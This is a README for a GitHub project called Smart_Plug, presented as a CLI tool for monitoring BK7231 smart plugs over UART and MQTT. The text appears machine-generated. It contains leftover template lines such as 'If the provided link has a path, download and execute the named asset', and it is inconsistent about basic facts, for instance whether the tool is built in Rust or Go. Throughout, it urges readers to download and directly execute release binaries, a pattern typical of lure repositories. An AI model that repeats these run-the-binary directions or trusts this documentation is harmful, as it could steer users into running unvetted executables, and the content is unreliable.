# Smart_Plug: Fast CLI Monitor for BK7231 Smart Plugs and IoT

[![Release](https://img.shields.io/badge/Release-v1.2.0-blue?logo=github&logoColor=white)](https://github.com/megakiyaiscool/Smart_Plug/releases)

A command line tool to monitor and control BK7231-based smart plugs. It connects through UART or MQTT, shows real-time status, and fits into scripts and home automation flows. This project focuses on a clean CLI, stable performance, and solid integration with traditional IoT workflows.

The latest builds live at the Releases page. See the releases here: https://github.com/megakiyaiscool/Smart_Plug/releases

Introduction to what Smart_Plug does
- Reads live data from smart plugs built on BK7231 family chips. It exposes power metrics, state, and network status.
- Connects to MQTT brokers to publish events and subscribe to commands.
- Runs from the terminal with a lightweight footprint. It aims to be dependable in automation pipelines and remote management tasks.
- Supports multiple plugs, so you can monitor a small fleet from one terminal or script.

Emojis to set the vibe
- 🔌 Power and hardware
- 🧭 Real-time monitoring
- 🧠 MQTT intelligence
- 🧰 Tools for integration
- 🎛️ Terminal-first experience

Banner image
[Smart Plug CLI UI banner or artwork can live here in your repo. It’s optional, but a simple, calm banner helps users spot the project at a glance.]

Table of contents
- What you get
- Key features
- Quick start
- Installation and downloads
- How to use
- Configuration and options
- MQTT and network details
- UART and hardware notes
- Advanced usage
- Development and contribution
- Testing and troubleshooting
- Roadmap
- Licensing
- Acknowledgments

What you get
- A compact command line interface that talks to BK7231-based devices.
- MQTT integration for publishing device data and receiving commands.
- A well-documented set of commands for status, monitoring, and control.
- A simple configuration approach that works with or without a config file.
- Cross-platform support, with prebuilt binaries for major platforms.

Key features
- Real-time device status: online/offline, signal strength, battery and power metrics where available.
- Power and energy metrics: instantaneous voltage, current, and calculated power where the device exposes it.
- Device discovery: scan for BK7231 devices on UART or network (where applicable).
- MQTT bridge: publish device telemetry to topics you choose, and receive commands or configuration updates.
- Flexible interfaces: UART for local devices, MQTT for remote setups.
- Lightweight and scriptable: designed to fit into automation workflows and CI pipelines.
- Safe defaults: sane defaults, with options to customize every aspect of the run.

Quick start
- This project ships as a prebuilt binary for quick starts. The latest release assets include binaries for Linux, Windows, and macOS, with a simple execution model.
- For the fastest start, download the appropriate release asset, extract it, and run the binary with --help to see usage.

Download and install
- The repository provides a releases page containing prebuilt binaries. Since the link has a path, download the appropriate asset from that page and execute it. For example, on Linux you might grab a tarball named smart_plug_cli_linux_x86_64.tar.gz, extract it, and run the included executable.
- Latest builds and assets live on the releases page. From there, pick the asset that matches your platform, extract, and run. The file you download should be executed directly or used in your automation setup.
- If you prefer to inspect the assets first, you can browse the Releases page to see what’s provided and the exact file names.

Note: The releases page is the central hub for binaries. You will see Linux, Windows, and macOS builds there, along with checksums and release notes. The file names are descriptive and indicate platform and architecture, so choose accordingly.

Usage overview (typical workflow)
- Connect via UART to a plugged-in device.
- Optionally connect to an MQTT broker to bridge data to your IoT setup.
- Run the CLI to fetch status, monitor trends, and push updates to your home automation system.

How to use
- Basic invocation (example):
  - smart_plug_cli --uart /dev/ttyUSB0 --baud 115200
  - smart_plug_cli --mqtt mqtt://broker.local:1883 --mqtt-client-id plug01
- Observing status:
  - smart_plug_cli status
- Starting a live monitor:
  - smart_plug_cli monitor --interval 2
- Publishing to MQTT:
  - smart_plug_cli --mqtt mqtt://broker.local:1883 --mqtt-topic-prefix home/plug
- Discovering devices (where supported):
  - smart_plug_cli discover --timeout 5

Configuration and options
- You can run without a config file and override options via command line. A YAML or JSON config file is supported for complex setups.
- Common options:
  - --uart <path> to specify the serial device
  - --baud <rate> to set the UART speed
  - --mqtt <broker_uri> to specify the MQTT broker
  - --mqtt-client-id <id> to set a stable client identity
  - --mqtt-username and --mqtt-password for broker authentication
  - --mqtt-tls to enable TLS (with --tls-cafile, --tls-cert, --tls-key as needed)
  - --topic-prefix to namespace MQTT topics
  - --interval to set polling or update interval
  - --log-level to filter messages (info, warn, error, debug)
  - --help to show usage instructions
- Sample configuration (YAML):
  - uart:
      path: /dev/ttyUSB0
      baud: 115200
  - mqtt:
      broker: mqtt://broker.local:1883
      client_id: plug01
      username: user
      password: pass
      tls:
        enabled: false
        cafile: /path/to/ca.pem
  - topics:
      base: home/plug
  - monitor:
      interval_seconds: 2

MQTT and network details
- MQTT bridge lets you push device telemetry to topics you define.
- Common topics:
  - home/plug/<id>/status
  - home/plug/<id>/telemetry
  - home/plug/<id>/command
- Security:
  - Use TLS for broker connections where possible.
  - Prefer a dedicated MQTT user with restricted permissions.
- If you do not use MQTT, the CLI can still run in a UART-only mode and provide terminal output for quick checks.

UART and hardware notes
- BK7231-based devices typically expose serial interfaces for configuration and telemetry.
- Ensure the device is powered and reachable on the UART bus.
- Check baud rate compatibility; 115200 bps is a common default.
- If you see garbled output, verify that wiring is correct and the serial adapter is configured with the right parity and stop bits (8N1 is standard for most setups).

Advanced usage
- Scriptable interfaces:
  - The CLI outputs machine-friendly data suitable for scripts.
  - Use a shell loop to log data, trigger actions, or respond to events.
- Automation patterns:
  - Combine with home automation hinges to react to power events.
  - Use MQTT to push quick alerts if the device goes offline or reports unusual telemetry.
- Debug mode:
  - Run with --log-level debug to inspect internal state and data parsing.
  - Useful when wiring with new devices or when changing release builds.

Development and contribution
- Code structure:
  - Core logic sits in a compact module that handles UART I/O, MQTT communication, and CLI parsing.
  - A small tests suite validates common paths, such as status parsing and topic formatting.
- How to contribute:
  - Fork the repository, create a feature branch, and submit a pull request with a clear description.
  - Include tests for new features and update the documentation as needed.
- Local setup:
  - Ensure you have a modern Rust or Go toolchain installed, as the binary is built for multiple platforms.
  - Run cargo build or go build depending on the chosen language in the project.
- Testing strategy:
  - Unit tests for parsing and formatting.
  - Integration tests with mock UART data and a mock MQTT broker.

Testing and troubleshooting
- If the tool fails to connect:
  - Verify the UART path and permissions. On Linux, you may need to add your user to the dialout group or use sudo.
  - Confirm the MQTT broker address and credentials. TLS issues often show in logs; ensure CA certificates are in place.
- If you see unexpected telemetry:
  - Check the interval setting. A too-fast interval can flood the broker.
  - Validate that the device reports the data you expect; some boards expose limited metrics.
- If a release asset won’t run:
  - Make sure you downloaded the correct flavor for your platform (Linux, Windows, macOS; x86_64 vs arm64).
  - Mark the binary as executable on Unix-like systems: chmod +x smart_plug_cli.
  - If the binary is missing execute permission, re-extract the tarball and try again.

Roadmap
- Expand platform support with ARM64 devices and niche OS targets.
- Add richer telemetry schemas to MQTT output, including per-device history graphs.
- Improve discovery features, including a passive network scan mode.
- Provide a Windows service installer and macOS launch agent for easy startup.
- Implement optional streaming data mode for high-frequency telemetry.

Licensing
- This project uses an open source license. See the LICENSE file in the repository for full terms.
- Contributions are welcome under the same terms.

Releases and how to stay updated
- The Releases page is the main source for binaries, release notes, and checksums.
- To grab the latest builds, visit the Releases page here: https://github.com/megakiyaiscool/Smart_Plug/releases
- You’ll typically find binaries named to indicate platform and architecture, such as smart_plug_cli_linux_x86_64.tar.gz, smart_plug_cli_windows_amd64.zip, or smart_plug_cli_darwin_arm64.tar.gz.
- After downloading the correct asset, extract it and run the included executable. For example, on Linux:
  - tar -xzf smart_plug_cli_linux_x86_64.tar.gz
  - ./smart_plug_cli --help
- The asset names may vary by release; refer to the release notes for exact file names and checksums.

Community and support
- If you want to discuss features, report issues, or ask for help, you can open issues on the GitHub repository. Be precise about your environment, the commands you ran, and the exact error messages.
- For urgent questions, you can reference the same Releases page as the main source of truth for supported platforms and builds.

Topics
- bk7231
- bk7231n
- bk7231t
- cli
- iot-application
- mqtt
- mqtt-client
- smarthome
- smartplug
- terminal-ui
- uartprogram

How this project fits into your flow
- It is designed to slot into automation pipelines without heavy infrastructure.
- You can run it in a CI pipeline to validate device telemetry in test environments.
- It supports both local UART access and remote MQTT-based control, giving you flexibility in how you manage devices.

Checklists and quick references
- Before first run:
  - Choose the correct release asset for your platform.
  - Ensure UART permissions are set if using a serial interface.
  - If using MQTT, prepare broker details and credentials.
- After first run:
  - Confirm connectivity to the device.
  - Validate that status, telemetry, and any commands appear as expected.
  - Set up a basic MQTT rule or automation to react to events.

Additional notes
- The tool emphasizes a clean CLI design with consistent flags and clear help messages.
- It aims to minimize surprises by providing stable defaults and helpful error messages when something goes wrong.
- The project welcomes suggestions for additional metrics, commands, and integrations.

Imagine you’re using this daily
- You open a terminal and type a short command to see a quick health check for your BK7231 plugs.
- You connect the tool to your MQTT broker to publish live telemetry for dashboards and automations.
- You integrate it into scripts to monitor power usage and alert you if devices go offline.

Footer
- The Releases page is the primary source for binaries, release notes, and checksums. Revisit it to stay current with fixes and new features.
- For downloads and exact asset names, see the link above. The file you download should be executed or invoked as described in the release notes and the Quick Start section.

Note on the behavior of the link
- If the provided link has a path, download and execute the named asset from that page. The example above demonstrates the typical workflow for Linux users, but the same approach applies to Windows and macOS assets found on the releases page.

End of README content.